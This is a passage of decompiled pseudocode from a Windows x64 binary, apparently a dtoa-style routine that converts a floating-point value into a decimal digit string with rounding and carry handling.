fcn.140006fa0(iVar10, 10, 0);\n        uStack256 = 0x140006132;\n        iVar20 = fcn.140006fa0(iVar20, 10, 0);\n    }\n    uStack76 = uStack76 + 1;\n    puVar14 = puVar16;\n    goto code_r0x000140006142;\ncode_r0x000140005a3b:\n    uVar18 = uVar15 + 1;\ncode_r0x000140005a44:\n    *puVar16 = uVar18;\n    uStack136._0_4_ = uVar21 + 1;\n    uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n    puVar17 = puStack144;\n    puVar16 = puVar14;\n    goto code_r0x000140005c45;\ncode_r0x000140005760:\n    *(uVar9 + 0x14) = 0;\ncode_r0x000140005524:\n    uStack256 = 0x14000552c;\n    uStack76 = fcn.140006cd0(uVar9);\n    uStack152 = uStack200 & 0xffffffff | uStack152._4_4_ << 0x20;\n    if (uStack76 != 0) {\n        uStack256 = 0x14000577a;\n        fcn.140006bd0(uVar9, uStack76);\n        uVar6 = uVar6 - uStack76;\n        uStack152 = uStack152 & 0xffffffff00000000 | uStack200 + uStack76;\n    }\n    if (*(uVar9 + 0x14) != 0) {\n        uStack256 = 0x140005560;\n        fcn.140007740(uVar9, &stack0xffffffffffffffb4);\n        iVar19 = uStack152 + uVar6;\n        iVar7 = iVar19 + -1;\n        uVar15 = extraout_XMM0_Qa >> 0x20 & 0xfffff | 0x3ff00000;\n        iVar4 = 1 - iVar19;\n        if (-1 < iVar7) {\n            iVar4 = iVar7;\n        }\n        dVar22 = ((extraout_XMM0_Qa & 0xffffffff | uVar15 << 0x20) - *0x14006e510) * *0x14006e518 + *0x14006e520 +\n                 iVar7 * *0x14006e528;\n        if (0 < iVar4 + -0x435) {\n            dVar22 = dVar22 + (iVar4 + -0x435) * *0x14006e530;\n        }\n        uStack128 = dVar22;\n        if ((dVar22 < 0.0) && (uStack128 != dVar22)) {\n            uStack128 = uStack128 - 1;\n        }\n        dStack104 = extraout_XMM0_Qa & 0xffffffff | uVar15 + iVar7 * 0x100000 << 0x20;\n        iVar7 = uVar6 - iVar7;\n        uStack156 = iVar7 - 1;\n        if (uStack128 < 0x17) {\n            if (dStack104 < *(*0x14006e820 + uStack128 * 8)) {\n                iStack116 = 0;\n                uStack128 = uStack128 - 1;\n                goto code_r0x0001400057a3;\n            }\n            iStack116 = 0;\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (iVar7 < 1) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\ncode_r0x000140005690:\n            uStack156 = uStack156 + uStack128;\n            uStack120 = 0;\n            uVar15 = uStack128;\n        }\n        else {\n            iStack116 = 1;\ncode_r0x0001400057a3:\n            uStack136 = uStack136._4_4_ << 0x20;\n            if (uStack156 < 0) {\n                uStack156 = 0;\n                uStack136 = CONCAT44(uStack136._4_4_, 1 - iVar7);\n            }\n            if (-1 < uStack128) goto code_r0x000140005690;\n            uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack128;\n            uStack120 = -uStack128;\n            uVar15 = 0;\n        }\n        if (in_stack_00000028 < 10) {\n            if (in_stack_00000028 < 6) {\n                bVar2 = iVar19 + 0x3fdU < 0x7f8;\n                if (in_stack_00000028 == 4) {\ncode_r0x000140006564:\n                    iStack124 = 1;\n                }\n                else {\n                    if (in_stack_00000028 == 5) {\ncode_r0x0001400063c8:\n                        iStack124 = 1;\n                        goto code_r0x000140005b40;\n                    }\n                    if (in_stack_00000028 != 2) {\n                        if (in_stack_00000028 == 3) {\n                            iStack124 = 0;\n                            goto code_r0x000140005b40;\n                        }\n                        goto code_r0x000140005a78;\n                    }\n                    iStack124 = 0;\n                }\ncode_r0x000140005835:\n                uVar13 = 1;\n                if (0 < uStack192) {\n                    uVar13 = uStack192 & 0xffffffff;\n                }\n                uStack76 = uVar13;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar13;\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar13;\n                uStack92 = uStack76;\n            }\n            else {\n                in_stack_00000028 = in_stack_00000028 - 4;\n                bVar2 = false;\n                if (in_stack_00000028 == 4) goto code_r0x000140006564;\n                if (in_stack_00000028 == 5) goto code_r0x0001400063c8;\n                iStack124 = 0;\n                if (in_stack_00000028 == 2) goto code_r0x000140005835;\n                in_stack_00000028 = 3;\ncode_r0x000140005b40:\n                uStack92 = uStack128 + uStack192;\n                uVar1 = uStack92 + 1;\n                uStack168 = uStack168 & 0xffffffff00000000 | uVar1;\n                uVar13 = 1;\n                if (0 < uVar1) {\n                    uVar13 = uVar1;\n                }\n                uStack76 = uVar13;\n            }\n            uStack256 = 0x140005870;\n            dStack112 = dStack104;\n            uStack96 = uVar15;\n            puStack144 = fcn.140005180(uVar13);\n            uStack160 = arg1[3] - 1;\n            dVar22 = dStack112;\n            uStack192._0_4_ = uStack96;\n            if (uStack160 == 0) {\ncode_r0x0001400058ba:\n                iVar20 = *0x14006e820;\n                dVar24 = *0x14006e548;\n                bVar2 = bVar2 & uStack168 < 0xf;\n                if ((!bVar2) || ((uStack128 | uStack160) != 0)) goto code_r0x000140005ce0;\n                uStack76 = 0;\n                if ((iStack116 != 0) && (dStack104 < *0x14006e540)) {\n                    if (uStack168 == 0) {\n                        dVar22 = dStack104 + dStack104 + *0x14006e558;\n                        dVar25 = dVar22 & 0xffffffff | (dVar22 >> 0x20) + 0xfcc00000 << 0x20;\n                        goto code_r0x000140005ca5;\n                    }\n                    if (0 < uStack92) {\n                        dVar22 = dStack104 * *0x14006e548;\n                        uVar21 = 0xffffffff;\n                        dVar25 = *0x14006e550 * dVar22 + *0x14006e558;\n                        dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                        uStack168._0_4_ = uStack92;\n                        dVar23 = dVar22;\n                        goto code_r0x00014000594d;\n                    }\ncode_r0x000140005cce:\n                    uStack160 = 0;\n                    goto code_r0x000140005ce0;\n                }\n                dVar25 = dStack104 + dStack104 + *0x14006e558;\n                dVar25 = dVar25 & 0xffffffff | (dVar25 >> 0x20) + 0xfcc00000 << 0x20;\n                if (uStack168 != 0) {\n                    uVar21 = 0;\n                    dVar23 = dStack104;\ncode_r0x00014000594d:\n                    dVar26 = *(*0x14006e820 + (uStack168 - 1) * 8);\n                    if (iStack124 != 0) {\n                        puVar16 = puStack144 + 1;\n                        dVar25 = *0x14006e580 / dVar26 - dVar25;\n                        *puStack144 = dVar23 + 0x30;\n                        dVar24 = *0x14006e548;\n                        dVar22 = *0x14006e540;\n                        dVar23 = dVar23 - dVar23;\n                        puVar14 = puVar16;\n                        if (dVar25 <= dVar23) {\n                            do {\n                                if (dVar22 - dVar23 < dVar25) {\n                                    uVar15 = *(puVar14 + -1);\n                                    goto code_r0x000140005a31;\n                                }\n                                uStack76 = uStack76 + 1;\n                                if (uStack168 <= uStack76) goto code_r0x000140005cce;\n                                dVar23 = dVar23 * dVar24;\n                                puVar16 = puVar14 + 1;\n                                dVar25 = dVar25 * dVar24;\n                                iVar7 = dVar23;\n                                *puVar14 = iVar7 + 0x30;\n                                dVar23 = dVar23 - iVar7;\n                                puVar14 = puVar16;\n                            } while (dVar25 <= dVar23);\n                        }\n                        uStack136._0_4_ = uVar21 + 1;\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar23 != 0.0) << 4;\n                        puVar17 = puStack144;\n                        goto code_r0x000140005c45;\n                    }\n                    dVar26 = dVar26 * dVar25;\n                    uStack76 = 1;\n                    puVar16 = puStack144;\n                    dVar25 = dVar22;\n                    bVar3 = false;\n                    while( true ) {\n                        iVar8 = dVar25;\n                        if (iVar8 != 0) {\n                            dVar25 = dVar25 - iVar8;\n                            bVar3 = bVar2;\n                        }\n                        uVar15 = iVar8 + 0x30;\n                        puVar14 = puVar16 + 1;\n                        *puVar16 = uVar15;\n                        if (uStack76 == uStack168) break;\n                        dVar25 = dVar25 * dVar24;\n                        uStack76 = uStack76 + 1;\n                        puVar16 = puVar14;\n                        bVar3 = bVar2;\n                    }\n                    if (!bVar3) {\n                        dVar25 = dVar22;\n                    }\n                    if (dVar26 + *0x14006e580 < dVar25) {\ncode_r0x000140005a31:\n                        do {\n                            puVar16 = puVar14 + -1;\n                            if (uVar15 != '9') goto code_r0x000140005a3b;\n                            if (puStack144 == puVar16) {\n                                uVar21 = uVar21 + 1;\n                                uVar18 = 0x31;\n                                goto code_r0x000140005a44;\n                            }\n                            uVar15 = *(puVar14 + -2);\n                            puVar14 = puVar16;\n                        } while( true );\n                    }\n                    if (dVar25 < *0x14006e580 - dVar26) {\n                        uStack176 = uStack176 & 0xffffffff00000000 | (dVar25 != 0.0) << 4;\ncode_r0x0001400069e0:\n                        do {\n                            puVar16 = puVar14;\n                            puVar14 = puVar16 + -1;\n                        } while (*(puVar16 + -1) == 0x30);\n                        uStack136._0_4_ = uVar21 + 1;\n                        puVar17 = puStack144;\n                        goto code_r0x000140005c45;\n                    }\n                    if (-1 < uStack152) {\n                        uStack160 = 0;\n                        if (-1 < arg1[5]) goto code_r0x000140005bcd;\n                        goto code_r0x000140006018;\n                    }\n                    uStack160 = 0;\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x000140005d98;\n                }\ncode_r0x000140005ca5:\n                if (dStack104 - *0x14006e560 <= dVar25) {\n                    if ((dVar25 ^ *0x14006e570) <= dStack104 - *0x14006e560) goto code_r0x000140005cce;\n                    goto code_r0x000140005f36;\n                }\n                uStack136._0_4_ = 2;\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x000140005c1f:\n                *puStack144 = 0x31;\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                puVar17 = puStack144;\n                puStack144 = puStack144 + 1;\n            }\n            else {\ncode_r0x000140005892:\n                uVar15 = 2;\n                if (-1 < uStack160) {\n                    uVar15 = uStack160;\n                }\n                uStack160 = uVar15;\n                if ((uVar21 & 8) != 0) {\n                    uStack160 = 3 - uVar15;\n                    goto code_r0x0001400058ba;\n                }\ncode_r0x000140005ce0:\n                if (uStack152 < 0) {\ncode_r0x000140005cee:\n                    if (iStack124 != 0) goto code_r0x000140005cfa;\ncode_r0x000140006018:\n                    iVar20 = 0;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uVar21 = uStack120;\n                    goto code_r0x000140005d98;\n                }\ncode_r0x000140005bb8:\n                iVar20 = *0x14006e820;\n                if (arg1[5] < uStack128) goto code_r0x000140005cee;\ncode_r0x000140005bcd:\n                dVar22 = *(iVar20 + uStack128 * 8);\n                if ((-1 < uStack192) || (0 < uStack168)) {\n                    uStack76 = 1;\n                    uStack136._0_4_ = uStack128 + 1;\n                    uVar6 = dStack104 / dVar22;\n                    *puStack144 = uVar6 + 0x30;\n                    dVar25 = *0x14006e548;\n                    puVar5 = puStack144;\n                    for (dVar24 = dStack104 - uVar6 * dVar22; puVar14 = puVar5 + 1,  puVar17 = puStack144, \n                        puVar16 = puVar14,  dVar24 != 0.0; dVar24 = dVar24 * dVar25 - uVar6 * dVar22) {\n                        if (uStack76 == uStack168) {\n                            uVar21 = uStack128;\n                            if (uStack160 == 0) {\n                                uVar15 = *puVar5;\n                                if ((dVar22 < dVar24 + dVar24) || ((dVar24 + dVar24 == dVar22 && ((uVar6 & 1) != 0))))\n                                goto code_r0x000140005a31;\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                goto code_r0x0001400069e0;\n                            }\n                            if (uStack160 == 1) {\n                                uVar15 = *puVar5;\n                                goto code_r0x000140005a31;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                            break;\n                        }\n                        uStack76 = uStack76 + 1;\n                        uVar6 = (dVar24 * dVar25) / dVar22;\n                        *puVar14 = uVar6 + 0x30;\n                        puVar5 = puVar14;\n                    }\n                    goto code_r0x000140005c45;\n                }\n                if ((uStack168 == 0) && (dVar22 * *0x14006e560 < dStack104)) {\n                    uStack136._0_4_ = uStack128 + 2;\n                    arg1_00 = 0;\n                    iVar20 = 0;\n                    goto code_r0x000140005c1f;\n                }\ncode_r0x000140005f36:\n                arg1_00 = 0;\n                iVar20 = 0;\ncode_r0x000140005f3b:\n                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                uStack136._0_4_ = -uStack192;\n                puVar17 = puStack144;\n            }\n            uStack256 = 0x140005c38;\n            fcn.140006f30(arg1_00);\n            puVar16 = puStack144;\n            if (iVar20 == 0) goto code_r0x000140005c45;\n        }\n        else {\n            bVar2 = iVar19 + 0x3fdU < 0x7f8;\n            in_stack_00000028 = 0;\ncode_r0x000140005a78:\n            uStack192 = uStack192 & 0xffffffff00000000 | uVar15;\n            uStack76 = iVar8 * *0x14006e538 + 3;\n            uStack256 = 0x140005aa6;\n            uStack168 = dStack104;\n            puStack144 = fcn.140005180(uStack76);\n            dVar22 = uStack168;\n            uStack160 = arg1[3] - 1;\n            if (uStack160 != 0) {\n                uStack192 = uStack192._4_4_ << 0x20;\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n                goto code_r0x000140005892;\n            }\n            uStack192 = uStack192._4_4_ << 0x20;\n            uStack168 = CONCAT44(uStack168._4_4_, 0xffffffff);\n            if (-1 < uStack152) {\n                iStack124 = 1;\n                uStack92 = 0xffffffff;\n                goto code_r0x000140005bb8;\n            }\n            uStack92 = 0xffffffff;\ncode_r0x000140005cfa:\n            uStack76 = (iVar8 - uVar6) + 1;\n            uVar21 = uStack120;\n            if (uStack152 - (iVar8 - uVar6) < arg1[1]) {\n                if ((in_stack_00000028 - 3 & 0xfffffffd) == 0) goto code_r0x000140006410;\n                uStack76 = (uStack152 - arg1[1]) + 1;\n                if ((1 < in_stack_00000028 && 0 < uStack168) && (uStack168 < uStack76)) {\n                    if (uStack168 - 1 <= uStack120) {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                        uVar21 = uStack120 - (uStack168 - 1);\n                        goto code_r0x000140005d73;\n                    }\n                    goto code_r0x0001400065bc;\n                }\n                uStack156 = uStack156 + uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n            }\n            else {\n                if (in_stack_00000028 < 2) {\n                    uStack156 = uStack156 + uStack76;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack76 + uStack136;\n                    goto code_r0x000140005d73;\n                }\ncode_r0x000140006410:\n                if (uStack120 < uStack168 - 1) {\ncode_r0x0001400065bc:\n                    uStack192._0_4_ = uStack192 + ((uStack168 - 1) - uStack120);\n                    uStack156 = uStack156 + uStack168;\n                    uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                    uStack76 = uStack168;\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    uVar21 = 0;\n                    uStack120 = uStack168 - 1;\n                }\n                else {\n                    uVar21 = uStack120 - (uStack168 - 1);\n                    if (uStack168 < 0) {\n                        uStack76 = 0;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 - uStack168;\n                    }\n                    else {\n                        uStack156 = uStack156 + uStack168;\n                        uStack76 = uStack168;\n                        uStack152 = uStack152 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                        uStack136 = uStack136 & 0xffffffff00000000 | uStack168 + uStack136;\n                    }\n                }\n            }\ncode_r0x000140005d73:\n            uStack256 = 0x140005d85;\n            uStack96 = uStack192;\n            iVar20 = fcn.140007060(1);\n            iStack124 = 1;\n            uStack192._0_4_ = uStack96;\ncode_r0x000140005d98:\n            if ((0 < uStack152) && (0 < uStack156)) {\n                uStack76 = uStack156;\n                if (uStack152 <= uStack156) {\n                    uStack76 = uStack152;\n                }\n                uStack136 = uStack136 & 0xffffffff00000000 | uStack136 - uStack76;\n                uStack156 = uStack156 - uStack76;\n                uStack152 = uStack152 & 0xffffffff00000000 | uStack152 - uStack76;\n            }\n            uVar13 = uVar9;\n            if (uStack120 != 0) {\n                if ((iStack124 != 0) && (uVar21 != 0)) {\n                    uStack256 = 0x14000665c;\n                    uStack96 = uStack192;\n                    iVar20 = fcn.140007280(iVar20, uVar21);\n                    uStack256 = 0x14000666a;\n                    uVar13 = fcn.140007120(iVar20, uVar9);\n                    uStack256 = 0x140006675;\n                    fcn.140006f30(uVar9);\n                    uStack120 = uStack120 - uVar21;\n                    uStack192._0_4_ = uStack96;\n                    if (uStack120 == 0) goto code_r0x000140005e04;\n                }\n                uStack256 = 0x140005df9;\n                uStack96 = uStack192;\n                uVar13 = fcn.140007280(uVar13, uStack120);\n                uStack192._0_4_ = uStack96;\n            }\ncode_r0x000140005e04:\n            uStack256 = 0x140005e16;\n            uStack120 = uStack192;\n            arg1_00 = fcn.140007060(1);\n            if (uStack120 == 0) {\n                uStack200._0_4_ = uStack120;\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) &&\n                   (bVar2 = arg1[1] + 1 < uStack200,  uStack200._0_4_ = uStack120,  bVar2)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                uVar21 = 0x1f;\n            }\n            else {\n                uStack256 = 0x14000639b;\n                arg1_00 = fcn.140007280(arg1_00, uStack120);\n                if (((in_stack_00000028 < 2) && (uVar6 == 1)) && (arg1[1] + 1 < uStack200)) {\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136 + 1;\n                    uStack200._0_4_ = 1;\n                    uStack156 = uStack156 + 1;\n                }\n                else {\n                    uStack200._0_4_ = 0;\n                }\n                puVar16 = arg1_00 + 0x18 + (*(arg1_00 + 0x14) + -1) * 4;\n                uVar21 = 0x1f;\n                if (*puVar16 != 0) {\n                    for (; *puVar16 >> uVar21 == 0; uVar21 = uVar21 - 1) {\n                    }\n                }\n                uVar21 = uVar21 ^ 0x1f;\n            }\n            uVar21 = (uVar21 - uStack156) - 4 & 0x1f;\n            uVar9 = uVar13;\n            uStack76 = uVar21;\n            if (0 < uStack136 + uVar21) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x140005e72;\n                uStack136 = arg1_00;\n                uVar9 = fcn.140007400(uVar13, uStack136 + uVar21);\n                arg1_00 = uStack136;\n            }\n            if (0 < uStack156 + uStack76) {\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                uStack256 = 0x140005e9f;\n                arg1_00 = fcn.140007400(arg1_00, uStack156 + uStack76);\n            }\n            bVar2 = 2 < in_stack_00000028;\n            if (iStack116 == 0) {\ncode_r0x000140005ebd:\n                if ((uStack168 < 1) && (bVar2)) {\ncode_r0x000140005ed4:\n                    if (uStack168 == 0) {\n                        uStack256 = 0x140005eee;\n                        uStack200 = fcn.140006fa0(arg1_00, 5, 0);\n                        uStack256 = 0x140005efe;\n                        iVar8 = fcn.140007510(uVar9, uStack200);\n                        arg1_00 = uStack200;\n                        if (0 < iVar8) {\n                            uStack136._0_4_ = uStack128 + 2;\n                            goto code_r0x000140005c1f;\n                        }\n                    }\n                    goto code_r0x000140005f3b;\n                }\n                uStack136._0_4_ = uStack128 + 1;\n                if (iStack124 != 0) {\ncode_r0x000140006047:\n                    iVar10 = iVar20;\n                    if (0 < uStack152 + uVar21) {\n                        uStack200 = uStack200 & 0xffffffff00000000 | uStack200;\n                        uStack256 = 0x140006064;\n                        uStack192 = arg1_00;\n                        iVar10 = fcn.140007400(iVar20, uStack152 + uVar21);\n                        arg1_00 = uStack192;\n                    }\n                    uStack200 = arg1_00;\n                    iVar20 = iVar10;\n                    if (uStack200 != 0) {\n                        uStack256 = 0x140006845;\n                        iVar20 = fcn.140006e40(*(iVar10 + 8));\n                        uStack256 = 0x140006861;\n                        sub.msvcrt.dll_memcpy(iVar20 + 0x10, iVar10 + 0x10);\n                        uStack256 = 0x14000686e;\n                        iVar20 = fcn.140007400(iVar20, 1);\n                    }\n                    uStack136 = uStack136 & 0xffffffff00000000 | uStack136;\n                    uStack76 = 1;\n                    uStack192 = uStack192 & 0xffffffff00000000 | in_stack_00000028;\n                    puVar14 = puStack144;\ncode_r0x000140006142:\n                    uStack256 = 0x140006156;\n                    iVar8 = fcn.140005270(uVar9, uStack200);\n                    uVar21 = iVar8 + 0x30;\n                    uStack256 = 0x140006167;\n                    uVar6 = fcn.140007510(uVar9, iVar10);\n                    uStack256 = 0x140006177;\n                    uVar13 = fcn.140007560(uStack200, iVar20);\n                    if (*(uVar13 + 0x10) == 0) {\n                        uStack256 = 0x140006194;\n                        uStack152 = uVar13;\n                        uStack156 = fcn.140007510(uVar9, uVar13);\n                        uStack256 = 0x1400061a2;\n                        fcn.140006f30(uStack152);\n                        puVar16 = uStack176;\n                        uVar15 = uStack156;\n                        if (((uStack156 | uStack192) != 0) ||\n                           (uVar15 = uStack156 | uStack192,  (*arg3 & 1 | uStack160) != 0)) goto code_r0x0001400060ad;\n                        if (uVar21 != 0x39) {\n                            if (uVar6 < 1) {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                                if (*(uVar9 + 0x14) < 2) {\n                                    uStack176 = puVar16 & 0xffffffff00000000 | (*(uVar9 + 0x18) != 0) << 4;\n                                }\n                            }\n                            else {\n                                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                                uVar21 = iVar8 + 0x31;\n                            }\n                            *puVar14 = uVar21;\n                            puVar16 = puVar14 + 1;\n                            arg1_00 = uStack200;\n                            goto code_r0x000140006200;\n                        }\ncode_r0x000140006969:\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x00014000696d;\n                    }\n                    uStack256 = 0x1400060a8;\n                    fcn.140006f30(uVar13);\n                    uVar15 = 1;\ncode_r0x0001400060ad:\n                    arg1_00 = uStack200;\n                    if ((uVar6 < 0) || (((uVar6 | uStack192) == 0 && ((*arg3 & 1) == 0)))) {\n                        if (uStack160 != 0) {\n                            if ((*(uVar9 + 0x14) < 2) && (*(uVar9 + 0x18) == 0)) {\n                                if (0 < uVar15) goto code_r0x0001400068f3;\n                                puVar16 = puVar14 + 1;\n                                goto code_r0x0001400067d2;\n                            }\n                            if (uStack160 == 2) goto code_r0x000140006952;\n                            uStack200 = uStack200 & 0xffffffff00000000 | uStack136 & 0xffffffff;\n                            while( true ) {\n                                puVar16 = puVar14 + 1;\n                                uStack256 = 0x1400067a5;\n                                iVar8 = fcn.140007510(arg1_00, iVar20);\n                                if (iVar8 < 1) break;\n                                *puVar14 = uVar21;\n                                uStack256 = 0x140006768;\n                                iVar11 = fcn.140006fa0(iVar20, 10, 0);\n                                if (iVar10 == iVar20) {\n                                    iVar10 = iVar11;\n                                }\n                                uStack256 = 0x140006782;\n                                uVar9 = fcn.140006fa0(uVar9, 10, 0);\n                                uStack256 = 0x140006793;\n                                iVar8 = fcn.140005270(uVar9, arg1_00);\n                                uVar21 = iVar8 + 0x30;\n                                iVar20 = iVar11;\n                                puVar14 = puVar16;\n                            }\n                            uStack136._0_4_ = uStack200;\n                            if (uVar21 == 0x39) {\ncode_r0x00014000696d:\n                                *puVar14 = 0x39;\n                                puVar17 = puStack144;\n                                puVar14 = puVar16;\n                                goto code_r0x000140006589;\n                            }\n                            uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                            uVar21 = uVar21 + 1;\ncode_r0x0001400067d2:\n                            *puVar14 = uVar21;\n                            goto code_r0x000140006200;\n                        }\n                        if (0 < uVar15) {\ncode_r0x0001400068f3:\n                            uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                            uStack256 = 0x14000690f;\n                            uStack176 = puVar14;\n                            uVar9 = fcn.140007400(uVar9, 1);\n                            uStack256 = 0x14000691f;\n                            iVar7 = fcn.140007510(uVar9, uStack200);\n                            puVar14 = uStack176;\n                            if ((iVar7 < 1) && ((iVar7 != 0 || ((uStack192 & 1) == 0)))) {\n                                uStack160 = 0x20;\n                                uVar21 = uStack192;\n                            }\n                            else {\n                                if (uStack192 == 0x39) goto code_r0x000140006969;\n                                uStack160 = 0x20;\n                                uVar21 = iVar8 + 0x31;\n                            }\n                        }\n                        if (*(uVar9 + 0x14) < 2) {\n                            if (*(uVar9 + 0x18) == 0) {\n                                puVar16 = puVar14 + 1;\n                                uStack176 = uStack176 & 0xffffffff00000000 | uStack160;\n                                arg1_00 = uStack200;\n                                goto code_r0x0001400067d2;\n                            }\n                        }\n                        else {\ncode_r0x000140006952:\n                        }\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                        puVar16 = puVar14 + 1;\n                        arg1_00 = uStack200;\n                        goto code_r0x0001400067d2;\n                    }\n                    puVar16 = puVar14 + 1;\n                    if ((0 < uVar15) && (uStack160 != 2)) {\n                        if (uVar21 == 0x39) goto code_r0x00014000696d;\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = uVar21 + 1;\n                        goto code_r0x000140006200;\n                    }\n                    *puVar14 = uVar21;\n                    if (uStack76 != uStack168) goto code_r0x0001400060f3;\n                    goto code_r0x000140006339;\n                }\n            }\n            else {\n                uStack256 = 0x140006265;\n                uStack200 = arg1_00;\n                uStack156 = uStack200;\n                iVar8 = fcn.140007510(uVar9, arg1_00);\n                arg1_00 = uStack200;\n                uStack200._0_4_ = uStack156;\n                if (-1 < iVar8) goto code_r0x000140005ebd;\n                uStack168 = uStack200;\n                uStack200 = uStack200 & 0xffffffff00000000 | uStack156;\n                uVar6 = uStack128 - 1;\n                uStack256 = 0x140006299;\n                uVar9 = fcn.140006fa0(uVar9, 10, 0);\n                arg1_00 = uStack168;\n                bVar3 = 0 < uStack92;\n                if (iStack124 != 0) {\n                    uStack256 = 0x140006a70;\n                    iVar20 = fcn.140006fa0(iVar20, 10, 0);\n                    arg1_00 = uStack168;\n                    if (!bVar2 || bVar3) {\n                        uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                        uStack136._0_4_ = uStack128;\n                        goto code_r0x000140006047;\n                    }\ncode_r0x000140006994:\n                    arg1_00 = uStack168;\n                    uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                    uStack128 = uVar6;\n                    goto code_r0x000140005ed4;\n                }\n                if (bVar2 && !bVar3) goto code_r0x000140006994;\n                uStack168 = uStack168 & 0xffffffff00000000 | uStack92;\n                uStack136._0_4_ = uStack128;\n            }\n            uStack76 = 1;\n            puVar14 = puStack144;\n            while( true ) {\n                puVar16 = puVar14 + 1;\n                uStack256 = 0x140006323;\n                iVar8 = fcn.140005270(uVar9, arg1_00);\n                uVar21 = iVar8 + 0x30;\n                *puVar14 = uVar21;\n                if (uStack168 <= uStack76) break;\n                uStack256 = 0x140006300;\n                uVar9 = fcn.140006fa0(uVar9, 10, 0);\n                uStack76 = uStack76 + 1;\n                puVar14 = puVar16;\n            }\n            iVar10 = 0;\ncode_r0x000140006339:\n            if (uStack160 == 0) {\n                uStack192 = uStack192 & 0xffffffff00000000 | uVar21;\n                uStack256 = 0x1400066b9;\n                uStack200 = arg1_00;\n                uVar9 = fcn.140007400(uVar9, 1);\n                uStack256 = 0x1400066c9;\n                iVar8 = fcn.140007510(uVar9, uStack200);\n                puVar17 = puStack144;\n                arg1_00 = uStack200;\n                puVar14 = puVar16;\n                if ((iVar8 < 1) && ((iVar8 != 0 || ((uStack192 & 1) == 0)))) goto code_r0x0001400066e7;\ncode_r0x000140006589:\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                    if (*(puVar16 + -1) != 0x39) {\n                        uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                        *puVar14 = *(puVar16 + -1) + 1;\n                        goto code_r0x000140006200;\n                    }\n                } while (puVar17 != puVar14);\n                uStack176 = CONCAT44(uStack176._4_4_, 0x20);\n                uStack136._0_4_ = uStack136 + 1;\n                *puStack144 = 0x31;\n            }\n            else {\n                if (uStack160 == 2) {\ncode_r0x0001400066e7:\n                    uStack176 = CONCAT44(uStack176._4_4_, 0x10);\n                    puVar14 = puVar16;\n                    if (*(uVar9 + 0x14) < 2) {\n                        iVar8 = *(uVar9 + 0x18);\n                        goto code_r0x000140006365;\n                    }\n                }\n                else {\n                    puVar17 = puStack144;\n                    puVar14 = puVar16;\n                    if ((1 < *(uVar9 + 0x14)) || (iVar8 = *(uVar9 + 0x18),  iVar8 != 0)) goto code_r0x000140006589;\ncode_r0x000140006365:\n                    uStack176 = uStack176 & 0xffffffff00000000 | (iVar8 != 0) << 4;\n                    puVar14 = puVar16;\n                }\n                do {\n                    puVar16 = puVar14;\n                    puVar14 = puVar16 + -1;\n                } while (*(puVar16 + -1) == 0x30);\n            }\ncode_r0x000140006200:\n            uStack256 = 0x140006208;\n            fcn.140006f30(arg1_00);\n            puVar17 = puStack144;\n            if (iVar20 == 0) goto code_r0x000140005c45;\n            if ((iVar10 != 0) && (iVar10 != iVar20)) {\n                uStack256 = 0x140006223;\n                fcn.140006f30(iVar10);\n                puVar17 = puStack144;\n            }\n        }\n        puStack144 = puVar16;\n        uStack256 = 0x140005c45;\n        fcn.140006f30(iVar20);\n        puVar16 = puStack144;\ncode_r0x000140005c45:\n        puStack144 = puVar16;\n        uStack256 = 0x140005c4d;\n        fcn.140006f30(uVar9);\n        *puStack144 = 0;\n        *puStack216 = uStack136;\n        if (ppuStack208 != NULL) {\n            *ppuStack208 = puStack144;\n        }\n        *puStack184 = *puStack184 | uStack176;\n        return puVar17;\n 